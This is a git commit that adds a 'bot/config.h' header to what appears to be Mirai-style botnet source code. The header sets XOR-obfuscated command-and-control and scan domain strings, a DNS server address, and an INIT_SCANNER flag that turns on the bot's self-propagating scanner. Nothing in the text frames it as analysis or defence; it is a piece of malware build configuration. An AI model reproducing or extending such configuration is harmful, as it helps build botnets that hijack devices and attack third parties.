f67b1cc09be22c0eb3fb8daf42a60378daab3624
ausyen20 <austinyen7@gmail.com>
2025-09-01 03:48:44 +0800

    initial commit

---
+++ bot/config.h
@@ -0,0 +1,12 @@
+#ifndef CONFIG_H 
+#define CONFIG_H 
+#define DOMAIN_NAME "\x55\x55\x55\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22"
+#define DOMAIN_NAME_LEN 14
+#define SCAN_DOMAIN_NAME "\x55\x55\x55\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22"
+#define SCAN_DOMAIN_NAME_LEN 14
+#define DNS_0 192
+#define DNS_1 168
+#define DNS_2 10
+#define DNS_3 30
+#define INIT_SCANNER
+#endif
